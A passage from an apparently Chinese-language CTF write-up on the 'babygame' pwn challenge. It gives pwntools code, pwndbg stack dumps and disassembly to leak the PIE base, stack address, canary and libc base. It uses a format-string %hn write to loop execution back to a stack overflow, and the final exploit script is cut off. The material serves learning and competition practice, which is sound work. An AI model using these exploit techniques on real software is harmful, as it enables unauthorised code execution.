class="number">0x7ffe86862088</span> —▸ <span class="number">0x7ffe86863393</span> ◂— <span class="string">&#x27;./babygame&#x27;</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8│     <span class="number">0x7ffe86861fb0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">36</span>:<span class="number">01b</span>0│     <span class="number">0x7ffe86861fb8</span> —▸ <span class="number">0x558b6a214465</span> ◂— endbr64 </span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│     <span class="number">0x7ffe86861fc0</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│     <span class="number">0x7ffe86861fc8</span> ◂— <span class="number">0x70fd944c7d5b3327</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│     <span class="number">0x7ffe86861fd0</span> —▸ <span class="number">0x558b6a214180</span> ◂— endbr64 </span><br><span class="line"><span class="number">3</span>a:<span class="number">01</span>d0│     <span class="number">0x7ffe86861fd8</span> —▸ <span class="number">0x7ffe86862080</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">3b</span>:<span class="number">01</span>d8│     <span class="number">0x7ffe86861fe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>c:<span class="number">01e0</span>│     <span class="number">0x7ffe86861fe8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>d:<span class="number">01e8</span>│     <span class="number">0x7ffe86861ff0</span> ◂— <span class="number">0x8f009940421b3327</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">01f</span>0│     <span class="number">0x7ffe86861ff8</span> ◂— <span class="number">0x8f22c4e53d953327</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">01f</span>8│     <span class="number">0x7ffe86862000</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x558b6a213000</span>     <span class="number">0x558b6a214000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    /home/yhellow/桌面/babygame</span><br><span class="line">    <span class="number">0x7fefa8526000</span>     <span class="number">0x7fefa8548000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      </span><br><span class="line">    /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/libc<span class="number">-2.31</span>.so</span><br></pre></td></tr></table></figure>
<p>因为开了PIE，所以我首先想到要 leak pro_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">232</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak_addr=<span class="built_in">eval</span>(<span class="built_in">hex</span>(leak_addr)+<span class="string">&#x27;0&#x27;</span>*<span class="number">2</span>) <span class="comment"># 末尾打印不出来</span></span><br><span class="line">pro_base=leak_addr-<span class="number">5376</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;pro_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>接下来要破解“game”，我最初的想法是：循环输入“1”直到打通为止，但伪随机数表中根本不可能出现这种情况，所以我打算也引入随机操作，只要种子合适，就有可能成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br></pre></td></tr></table></figure>
<p>其实 seed 是可以被覆盖的，但是我为了 leak pro_base 放弃了覆盖 seed，为了可以覆盖 seed ，就必须先获得 leak canary</p>
<p>当时就卡在了这里，后面可以 leak stack_addr 的数据都被 canary 保护，即使通过了“game”，在开了PIE的情况下也无法利用格式化漏洞</p>
<p>通过“game”的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">	num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br></pre></td></tr></table></figure>
<p>在学习了我们组里一位大佬的 wp 后，我感觉很奇怪， <strong>canary明明被覆盖了却没有立刻报错，后续的利用依然可以正常执行</strong> ，基于这点就可以 leak stack_addr了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">256</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">stack_addr=leak_addr-<span class="number">528</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">	num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br></pre></td></tr></table></figure>
<p>这样可以把rbp泄露出来，通过rbp来计算 stack_addr（这里不选择 leak stack_base，通过rbp计算出的stack_base不准确，stack_addr 就是 read 写入的栈地址）</p>
<p>下一步就是利用格式化漏洞来构造循环（因为我们肯定会多次执行程序）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x557a74bd3449</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line">       vararg: <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>初步定位格式化参数的位置（输入20个“-%p”）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good luck to you.</span><br><span class="line"><span class="number">-0x7ffee08a7670</span><span class="number">-0x100</span><span class="number">-0x7f82e8359002</span><span class="number">-0x12</span>-(nil)<span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x99059999</span><span class="number">-0xffffffffffffffff</span><span class="number">-0xd68</span><span class="number">-0x7ffee08a7894</span><span class="number">-0x7ffee08a7760</span><span class="number">-0x557a74bd3180</span><span class="number">-0x7ffee08a79a0</span>-(nil)-(nil)<span class="number">-0x7f82e828f5f4</span><span class="number">-0x8</span><span class="number">-0x557a74bd32ef</span><span class="number">-0xa32</span>-(nil)-(nil)\x99\x99\x05*** <span class="built_in">stack</span> smashing detected ***: terminated</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffee08a7678</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffee08a7680</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffee08a7688</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7ffee08a7690</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x7ffee08a7698</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│             <span class="number">0x7ffee08a76a0</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│             <span class="number">0x7ffee08a76a8</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│             <span class="number">0x7ffee08a76b0</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│             <span class="number">0x7ffee08a76b8</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│             <span class="number">0x7ffee08a76c0</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│             <span class="number">0x7ffee08a76c8</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│             <span class="number">0x7ffee08a76d0</span> ◂— <span class="number">0x99059999</span> <span class="comment">/* No.18 */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│             <span class="number">0x7ffee08a76d8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│             <span class="number">0x7ffee08a76e0</span> ◂— <span class="number">0xd68</span> </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│             <span class="number">0x7ffee08a76e8</span> —▸ <span class="number">0x7ffee08a7894</span> ◂— <span class="number">0x6161616100000001</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│             <span class="number">0x7ffee08a76f0</span> —▸ <span class="number">0x7ffee08a7760</span> —▸ <span class="number">0x7ffee08a7780</span> —▸ <span class="number">0x7ffee08a78b0</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│             <span class="number">0x7ffee08a76f8</span> —▸ <span class="number">0x557a74bd3180</span> ◂— endbr64 </span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│             <span class="number">0x7ffee08a7700</span> —▸ <span class="number">0x7ffee08a79a0</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>第一次定位没有发现合适的目标，极有可能被“-%p”覆盖了，所以第二次采用精确定位，随便看看覆盖那部分有没有目标：（输入“-%11$p”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good luck to you.</span><br><span class="line"><span class="number">-0x7ffd31ce53d0</span>*** <span class="built_in">stack</span> smashing detected ***: terminated</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffd31ce52d0</span> ◂— <span class="number">0x70243131252d</span> <span class="comment">/* &#x27;-%11$p&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffd31ce52d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffd31ce52e0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffd31ce52e8</span> —▸ <span class="number">0x7efd3be66d6f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x18</span>]  <span class="comment">/* target No.9 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7ffd31ce52f0</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x7ffd31ce52f8</span> —▸ <span class="number">0x7ffd31ce53d0</span> ◂— <span class="number">0x64f17ed180</span> <span class="comment">/* No.11 */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│             <span class="number">0x7ffd31ce5300</span> —▸ <span class="number">0x7ffd31ce5310</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│             <span class="number">0x7ffd31ce5308</span> ◂— <span class="number">0xb87bdb51f4286a00</span> <span class="comment">/* canary No.13 */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│             <span class="number">0x7ffd31ce5310</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│             <span class="number">0x7ffd31ce5318</span> ◂— <span class="number">0x64</span> </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│             <span class="number">0x7ffd31ce5320</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│             <span class="number">0x7ffd31ce5328</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│             <span class="number">0x7ffd31ce5330</span> ◂— <span class="number">0x99059999</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│             <span class="number">0x7ffd31ce5338</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│             <span class="number">0x7ffd31ce5340</span> ◂— <span class="number">0xd68</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│             <span class="number">0x7ffd31ce5348</span> —▸ <span class="number">0x7ffd31ce54f4</span> ◂— <span class="number">0x6161616100000001</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│             <span class="number">0x7ffd31ce5350</span> —▸ <span class="number">0x7ffd31ce53c0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│             <span class="number">0x7ffd31ce5358</span> —▸ <span class="number">0x5590f17ed180</span> ◂— endbr64 </span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│             <span class="number">0x7ffd31ce5360</span> —▸ <span class="number">0x7ffd31ce5600</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│             <span class="number">0x7ffd31ce5368</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│             <span class="number">0x7ffd31ce5370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│             <span class="number">0x7ffd31ce5378</span> —▸ <span class="number">0x7efd3be495f4</span> (atoi+<span class="number">20</span>) ◂— add    rsp, <span class="number">8</span> <span class="comment">/* to leak libc_base No.27 */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│             <span class="number">0x7ffd31ce5380</span> ◂— <span class="number">0x8</span> </span><br></pre></td></tr></table></figure>
<p>可以发现：可以在“No.13”处泄露canary，可以在“No.27”处泄露libc_base</p>
<p>写入的内容必须使程序可以循环（这里我想不明白），在和大佬交流过后，我找到了解决的办法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffd31ce52d0</span> ◂— <span class="number">0x70243131252d</span> <span class="comment">/* &#x27;-%11$p&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffd31ce52d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffd31ce52e0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffd31ce52e8</span> —▸ <span class="number">0x7efd3be66d6f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, </span><br></pre></td></tr></table></figure>
<p>可以在“read”控制的范围中写入栈上的某个地址，直接修改其内容（这个地址最好是函数pwn的返回地址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>:<span class="number">0110</span>│ rbp         <span class="number">0x7ffd1b017280</span> —▸ <span class="number">0x7ffd1b0173b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│             <span class="number">0x7ffd1b017288</span> —▸ <span class="number">0x560a9a5ba543</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line">    <span class="comment">/* pwn的返回地址 */</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│             <span class="number">0x7ffd1b017290</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="comment">/* 其实这里就是stack_addr(第一次read写入的地址) */</span></span><br></pre></td></tr></table></figure>
<p>可以直接计算返回地址的栈地址，在“No.9”的位置写入它（注意内存对齐）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target_stack=stack_addr-<span class="number">0x8</span></span><br><span class="line">payload = <span class="string">&quot;%13$p%27$p&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x54c2</span>-<span class="number">0x20</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%9$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload = flat([payload,p64(target_stack)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((p.recv(<span class="number">16</span>)),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>((p.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">280052</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7fff152d9870</span> ◂— <span class="number">0x3732257024333125</span> (<span class="string">&#x27;%13$p%27&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7fff152d9878</span> ◂— <span class="number">0x3636363132257024</span> (<span class="string">&#x27;$p%21666&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7fff152d9880</span> ◂— <span class="number">0x61616e6824392563</span> (<span class="string">&#x27;c%9$hnaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7fff152d9888</span> —▸ <span class="number">0x7fff152d9988</span> —▸ <span class="number">0x55ddcf5f9543</span> ◂— mov    eax, <span class="number">0</span> <span class="comment">/* 此处已经被写入了pwn的返回地址,偏移为&quot;9&quot; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7fff152d9890</span> ◂— <span class="number">0x300000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000014B</span>D <span class="number">128</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000000014</span>C2 <span class="number">128</span>                 lea     rax, [rbp+name] <span class="comment">// 0x54c2</span></span><br><span class="line">.text:<span class="number">00000000000014</span>C9 <span class="number">128</span>                 mov     edx, <span class="number">256</span>h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000000014</span>CE <span class="number">128</span>                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000000014</span>D1 <span class="number">128</span>                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">    <span class="comment">/* 我们已经泄露了canary,劫持程序回到栈溢出的点就可以获取shell */</span></span><br><span class="line">    <span class="comment">/* 这个&quot;5&quot;其实是随便写的,因为地址随机化是按页划分的,覆盖低3位,就有1/16的概率匹配 */</span></span><br><span class="line">    <span class="comment">/* 至于为什么选择这个地址,其实也没有什么要求,在这附近就行(在read之前) */</span></span><br></pre></td></tr></table></figure>
<p>最后的栈溢出获取 shell 就很简单了，挂一下完整exp：（注意爆破脚本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">key=cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line">	payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">256</span>+<span class="string">&#x27;1&#x27;</span>*<span 